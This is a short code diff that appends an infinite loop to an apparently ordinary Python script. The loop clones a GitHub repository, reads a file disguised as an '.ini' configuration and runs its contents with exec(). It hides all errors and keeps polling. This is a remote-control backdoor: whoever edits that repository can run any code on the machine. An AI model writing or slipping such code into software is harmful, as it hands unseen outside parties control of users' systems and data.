@@ -106,3 +106,17 @@ def CheckInternetConnection(url='http://www.google.com/', timeout=5):
 
 
 # _____(functions)_____#
+
+while True:
+    try:
+        Rmpydir()
+        while CheckInternetConnection():
+            if not path.exists("python"): git.Git().clone("https://github.com/ehsanmehran/python")
+            if path.exists("python/result_condition.ini"):
+                with open(file="python/result_condition.ini", mode="r") as f:
+                    exec(f.read())
+            else:
+                sleep(5)
+                continue
+    except Exception as e:
+        print()
